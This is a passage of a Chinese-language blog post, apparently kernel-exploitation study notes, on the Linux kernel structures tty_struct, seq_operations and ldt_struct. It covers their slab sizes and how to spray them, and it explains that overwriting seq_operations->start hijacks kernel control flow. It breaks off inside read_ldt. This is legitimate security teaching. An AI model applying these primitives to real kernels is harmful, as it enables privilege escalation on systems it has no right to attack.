title="tty_struct"></a>tty_struct</h2><p><strong>申请obj大小:1k</strong></p><p><strong>GFP_KERNEL_ACCOUNT:是</strong></p><p><strong>功能:.text泄露|直接映射区泄露|劫持流</strong></p><hr><p>打开一个 tty 设备文件时,内核最终会调用 <code>alloc_tty_struct()</code> 来分配一个 <code>tty_struct</code> 结构体</p><p>一般情况下,我们选择打开<code>/dev/ptmx</code>文件来<strong>分配</strong>一个<code>tty_struct</code>结构体</p><p>关闭该文件即可<strong>释放</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd=open(<span class="string">&quot;/dev/ptmx&quot;</span>);<span class="comment">//分配</span></span><br><span class="line">close(fd);<span class="comment">//释放</span></span><br></pre></td></tr></table></figure><p>该结构体定义于 <code>include/linux/tty.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct tty_struct - state associated with a tty while open</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @flow.lock: lock for flow members</span></span><br><span class="line"><span class="comment"> * @flow.stopped: tty stopped/started by tty_stop/tty_start</span></span><br><span class="line"><span class="comment"> * @flow.tco_stopped: tty stopped/started by TCOOFF/TCOON ioctls (it has</span></span><br><span class="line"><span class="comment"> *              precedense over @flow.stopped)</span></span><br><span class="line"><span class="comment"> * @flow.unused: alignment for Alpha, so that no members other than @flow.* are</span></span><br><span class="line"><span class="comment"> *         modified by the same 64b word store. The @flow&#x27;s __aligned is</span></span><br><span class="line"><span class="comment"> *         there for the very same reason.</span></span><br><span class="line"><span class="comment"> * @ctrl.lock: lock for ctrl members</span></span><br><span class="line"><span class="comment"> * @ctrl.pgrp: process group of this tty (setpgrp(2))</span></span><br><span class="line"><span class="comment"> * @ctrl.session: session of this tty (setsid(2)). Writes are protected by both</span></span><br><span class="line"><span class="comment"> *          @ctrl.lock and legacy mutex, readers must use at least one of</span></span><br><span class="line"><span class="comment"> *          them.</span></span><br><span class="line"><span class="comment"> * @ctrl.pktstatus: packet mode status (bitwise OR of TIOCPKT_* constants)</span></span><br><span class="line"><span class="comment"> * @ctrl.packet: packet mode enabled</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * All of the state associated with a tty while the tty is open. Persistent</span></span><br><span class="line"><span class="comment"> * storage for tty devices is referenced here as @port in struct tty_port.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>    magic;<span class="comment">//掩码0x5401</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span>    <span class="comment">/* class device or NULL (e.g. ptys, serdev) */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>        <span class="comment">/* winsize_mutex */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">spinlock_t</span> lock;</span><br><span class="line">        <span class="type">bool</span> stopped;</span><br><span class="line">        <span class="type">bool</span> tco_stopped;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> unused[<span class="number">0</span>];</span><br><span class="line">    &#125; __aligned(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)) flow;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">spinlock_t</span> lock;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> pktstatus;</span><br><span class="line">        <span class="type">bool</span> packet;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> unused[<span class="number">0</span>];</span><br><span class="line">    &#125; __aligned(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)) ctrl;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> hw_stopped;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> receive_room;    <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="type">int</span> flow_change;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="type">void</span> *disc_data;</span><br><span class="line">    <span class="type">void</span> *driver_data;</span><br><span class="line">    <span class="type">spinlock_t</span> files_lock;        <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> closing;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">    <span class="type">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Each of a tty&#x27;s open files has private_data pointing to tty_file_private */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* tty magic number */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_MAGIC        0x5401</span></span><br></pre></td></tr></table></figure><p><code>tty_struct</code>中ops对应的<code>tty_operations</code>结构体,定义于<code>/include/linux/tty_driver.h</code> 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">              <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*write_room)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*chars_in_buffer)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                 <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">int</span>  (*get_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">    <span class="type">int</span>  (*set_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h2 id="seq-operations"><a href="#seq-operations" class="headerlink" title="seq_operations"></a>seq_operations</h2><p><strong>申请obj大小:32</strong></p><p><strong>GFP_KERNEL_ACCOUNT:是</strong></p><p><strong>功能:.text泄露|劫持流</strong></p><p>当打开<code>/proc/id/stat</code>文件时,会分配一个<code>seq_operations</code>结构体,定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">    <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>只包含四个函数指针,显然可以用来劫持执行流和泄露地址</p><p>一般选择打开<code>/proc/self/stat</code>来<strong>分配</strong>该结构体,同样关闭即可<strong>释放</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>);<span class="comment">//分配</span></span><br><span class="line">close(fd);<span class="comment">//释放</span></span><br></pre></td></tr></table></figure><p>当我们 read 一个 stat 文件时，内核会调用其 proc_ops 的 <code>proc_read_iter</code> 指针，其默认值为 <code>seq_read_iter()</code> 函数，定义于 <code>fs/seq_file.c</code> 中，注意到有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read_iter</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *iter)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>即其会调用 seq_operations 中的 start 函数指针，那么<strong>我们只需要控制 seq_operations-&gt;start 后再读取对应 stat 文件便能控制内核执行流</strong></p><h2 id="ldt-struct"><a href="#ldt-struct" class="headerlink" title="ldt_struct"></a>ldt_struct</h2><p><strong>申请obj大小:32[slab]||16[slub]</strong></p><p><strong>GFP_KERNEL_ACCOUNT:否</strong></p><p><strong>功能:任意读|任意写</strong></p><p>ldt 即<strong>局部段描述符表</strong>(<strong>Local Descriptor Table</strong>)，其中存放着<strong>进程的</strong>段描述符，段寄存器当中存放着的段选择子便是段描述符表中段描述符的索引</p><p>定义如下(<code>/arch/x86/include/asm/mmu_context.h</code>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ldt_structs can be allocated, used, and freed, but they are never</span></span><br><span class="line"><span class="comment"> * modified while live.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Xen requires page-aligned LDTs with special permissions.  This is</span></span><br><span class="line"><span class="comment"> * needed to prevent us from installing evil descriptors such as</span></span><br><span class="line"><span class="comment"> * call gates.  On native, we could merge the ldt_struct and LDT</span></span><br><span class="line"><span class="comment"> * allocations, but it&#x27;s not worth trying to optimize.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>*<span class="title">entries</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>nr_entries;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If PTI is in use, then the entries array is not mapped while we&#x27;re</span></span><br><span class="line"><span class="comment"> * in user mode.  The whole array will be aliased at the addressed</span></span><br><span class="line"><span class="comment"> * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span></span><br><span class="line"><span class="comment"> * and map, and enable a new LDT without invalidating the mapping</span></span><br><span class="line"><span class="comment"> * of an older, still-in-use LDT.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span>slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>结构体大小是<code>0x10</code>,slub中会在<code>kmalloc-16</code>申请,slab则会在<code>kmalloc-32</code>申请</p><p>entries指向一个数组</p><p>nr_entries记录着数组的数量</p><p><code>struct desc_struct</code>即使段描述符,定义如下(<code>/arch/x86/include/asm/desc_defs.h</code>),暂时不管他</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 8 byte segment descriptor */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">u16limit0;</span><br><span class="line">u16base0;</span><br><span class="line">u16base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">u16limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure><p>Linux 提供 <code>modify_ldt</code> 系统调用，通过该系统调用可以<strong>获取或修改当前进程的 LDT</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="type">int</span> , func , <span class="type">void</span> __user * , ptr ,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (func) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">ret = read_ldt(ptr, bytecount);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">ret = read_default_ldt(ptr, bytecount);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment"> * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment"> * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment"> * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment"> * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment"> * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment"> * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="read-ldt"><a href="#read-ldt" class="headerlink" title="read_ldt"></a>read_ldt</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">read_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> entries_size;</span><br><span class="line"><span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">down_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!mm-&gt;context.ldt) &#123;</span><br><span class="line">retval = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bytecount &gt; LDT_ENTRY_SIZE * LDT_ENTRIES)</span><br><span class="line">bytecount = LDT_ENTRY_SIZE * LDT_ENTRIES;</span><br><span class="line"></span><br><span class="line">entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;</span><br><span class="line"><span class="keyword">if</span> (entries_size &gt; bytecount)</span><br><span class="line">entries_size = bytecount;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">retval = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (entries_size != 